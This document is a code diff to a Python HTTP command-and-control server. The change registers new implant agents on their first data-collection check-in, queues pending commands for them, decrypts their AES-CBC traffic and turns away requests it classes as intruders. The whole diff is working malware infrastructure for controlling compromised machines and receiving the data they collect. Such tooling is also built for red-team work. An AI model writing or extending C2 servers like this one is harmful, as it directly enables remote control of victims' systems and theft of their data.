@@ -85,7 +85,16 @@ class C2(BaseHTTPRequestHandler):
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
         elif command_type == "collect":
-            agents[agent]["info"] = agent_data["data"]
+            # agent exists
+            try: 
+                agents[agent]["info"] = agent_data["data"]
+            # new agent 
+            except KeyError: 
+                agents[agent] = {
+                    "info": agent_data["data"],
+                    "pending_commands": []
+                }
+
             utils.log_message(f"[*] Collected data from agent {agent} [command: {command_type}]")
 
         else:
@@ -95,14 +104,19 @@ class C2(BaseHTTPRequestHandler):
 
     def do_POST(self):
         self.log_message = self.default_logger_sinkhole
-        if self.validate_request() == "exists":
+        request_classification = self.validate_request()
+        if (request_classification != "intruder"):
             self.send_default_headers_and_status_code()
             content_len = int(self.headers.get('Content-Length'))
             post_body = utils.decrypt_cbc(self.rfile.read(content_len))
-            self.parse_agent_data(json.loads(utils.sanitize_data(post_body)))
-            self.update_last_checkin()
-        else:
-            self.close_connection = True
+            agent_data = json.loads(utils.sanitize_data(post_body))
+            if (request_classification == "exists" or \
+                (request_classification == "new" and agent_data["command_type"] == "collect")):
+                self.parse_agent_data(agent_data)
+                self.update_last_checkin()
+                return
+        # intruder or new agent that didn't collected data as first request - Bye Bye
+        self.close_connection = True
 
     def do_GET(self):
         self.log_message = self.default_logger_sinkhole
